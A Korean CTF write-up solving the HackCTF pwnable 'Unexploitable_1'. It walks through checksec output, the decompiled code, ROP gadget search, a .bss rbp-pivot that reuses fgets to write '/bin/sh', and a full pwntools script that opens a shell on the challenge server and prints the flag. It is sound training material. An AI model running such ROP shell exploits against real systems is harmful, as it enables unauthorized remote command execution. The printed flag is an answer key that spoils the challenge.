# Unexploitable

---

우선 보호기법은 다음과 같다.

```gdb
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

shellcode를 통하지 않는듯 하다.

`main()`코드를 살펴보자.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-10h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  fwrite("Easy RTL ha? You even have system@plt!\n", 1uLL, 0x27uLL, stdout);
  fflush(stdin);
  fgets(&s, 64, stdin);
  return 0;
}
```

RTL문제인듯 하다.

또 다음과 같은 함수가 있다.
```c
int gift()
{
  return system("use this system gadget :D");
}
```
system 함수를 사용할 수 있도록 system@plt를 주었다.

다음과 같이 익스할 것이다.

[pop rdi ret] gadget과 "/bin/sh"의 위치를 구해서 rdi에 "/bin/sh"를 넣은 다음 system@plt로 ret시키면 된다. 하지만 이를 위해서는 "/bin/sh"의 위치를 구해야 하는데 이 위치를 구하기 위해서는 libc base주소가 필요하다. 때문에 `fwrite()`를 이용해서 system의 got를, 즉 system함수의 주소를 출력하여 libc base를 구한뒤 /bin/sh의 주소를 구하여 `system()`로 ret시킬 것이다.

이를 위해서 필요한 정보는 다음과 같다.

**pop\_rdi\_ret <br>
pop\_rsi\_ret <br>
pop\_rdx\_ret <br>
pop\_rcx\_ret <br>
fwrite\_plt <br>
system\_plt <br>
system\_got <br>
system\_offset <br>
binsh\_offset**

하지만 pop\_rdx\_ret과 pop\_rcx\_ret을 구현할 코드가 존재하지 않는다.

`fwrite()`이외에 출력할 수 있는 함수가 존재하지 않기 때문에 libc_base를 lick할 수 없다. 때문에 이 프로세스에서 사용되지 않은 다른 함수를 사용할 수 없으며, 기존에 있던 "/bin/sh" 문자열 또한 사용할 수 없다.

때문에 "/bin/sh"문자열을 새로 써야한다. stack에 쓰려고 하였더니 stack의 주소를 rdi로 넘길 방법이 없다. "mov rdi, rbp"와 같은 gadget을 구현할 방법이 없다. 때문에 `fgets()`를 이용해야한다.

```gdb
gdb-peda$ pd main
Dump of assembler code for function main:
...
   0x000000000040074d <+113>:	mov    rdx,QWORD PTR [rip+0x20091c]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x0000000000400754 <+120>:	lea    rax,[rbp-0x10]
   0x0000000000400758 <+124>:	mov    esi,0x40
   0x000000000040075d <+129>:	mov    rdi,rax
   0x0000000000400760 <+132>:	call   0x400580 <fgets@plt>
   0x0000000000400765 <+137>:	mov    eax,0x0
   0x000000000040076a <+142>:	leave  
   0x000000000040076b <+143>:	ret    
End of assembler dump.
```

`main()`의 다음 부분을 보면 rbp의 값을 조작할 수 있다면 원하는 장소에 문자열을 쓸 수 있다. 고정주소인 bss영역에 "/bin/sh"를 쓸 것이며 그러기 위해서는 "pop rbp; ret" gadget이 필요하다.

```bash
sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/24.Unexploitable_1$ ROPgadget --binary Unexploitable_1 | grep "pop"
...
0x0000000000400630 : pop rbp ; ret
...
```

다행히 gadget이 존재한다.

따라서 다음과 같이 익스할 것이다. pop rbp; ret gadget을 통해서 rbp에 bss주소+0x10을 저장하고 `main()+113`으로 ret시킬 것이다. 이후 bss영역에 "/bin/sh"를 쓴 다음, pop rdi; ret gadget을 통해서 rdi에 bss주소를 넣고, gift로 ret시킬 것이다.

이를 위한 정보는 다음과 같다.

**pop\_rbp\_ret <br>
pop\_rdi\_ret <br>
main_113 <br>
bss <br>
system@plt**

위에서 pop\_rbp\_ret의 주소는 구했다.

**pop\_rbp\_ret=0x400630**

```gdb
gdb-peda$ ropsearch "pop rdi; ret"
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x004007d3 : (b'5fc3')	pop rdi; ret
```

**pop\_rdi\_ret=0x4007d3**

위에서 `main()+113`의 주소는 구했다.

**main_113=0x40074d**

```bashsjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/24.Unexploitable_1$ objdump -h Unexploitable_1 | grep "bss"
 25 .bss          00000020  0000000000601060  0000000000601060  00001058  2**4
```

**bss=0x601060**

```gdb
gdb-peda$ pd gift
Dump of assembler code for function gift:
   0x00000000004006c6 <+0>:	push   rbp
   0x00000000004006c7 <+1>:	mov    rbp,rsp
   0x00000000004006ca <+4>:	mov    edi,0x4007f8
   0x00000000004006cf <+9>:	mov    eax,0x0
   0x00000000004006d4 <+14>:	call   0x400560 <system@plt>
   0x00000000004006d9 <+19>:	nop
   0x00000000004006da <+20>:	pop    rbp
   0x00000000004006db <+21>:	ret    
End of assembler dump.
```

**gift=0x4006d4**

다음과 같은 익스코드를 통해서 익스할 수 있었다.

```python
from pwn import*
#p=process('./Unexploitable_1')
p=remote('ctf.j0n9hyun.xyz', 3023)

p.recvline()

pop_rbp_ret=0x400630
pop_rdi_ret=0x4007d3
main_113=0x40074d
gift=0x4006d4
bss=0x601060+0x900

payload='A'*24
payload+=p64(pop_rbp_ret)
payload+=p64(bss+0x10)
payload+=p64(main_113)
p.sendline(payload)


payload2='/bin/sh\x00'
payload2+='\x00'*8
payload2+='A'*8
payload2+=p64(pop_rdi_ret)
payload2+=p64(bss)
payload2+=p64(gift)
p.sendline(payload2)

p.interactive()
```

flag는 다음과 같다.

```bash
sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/24.Unexploitable_1$ python ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3023: Done
[*] Switching to interactive mode
$ cat flag
HackCTF{dyn5tr_tr1ck_^_^}

```

**flag: HackCTF{dyn5tr_tr1ck_^_^}**

[?] system@plt로 ret시키면 안되고 gift로 ret시켜야 하는 이유?
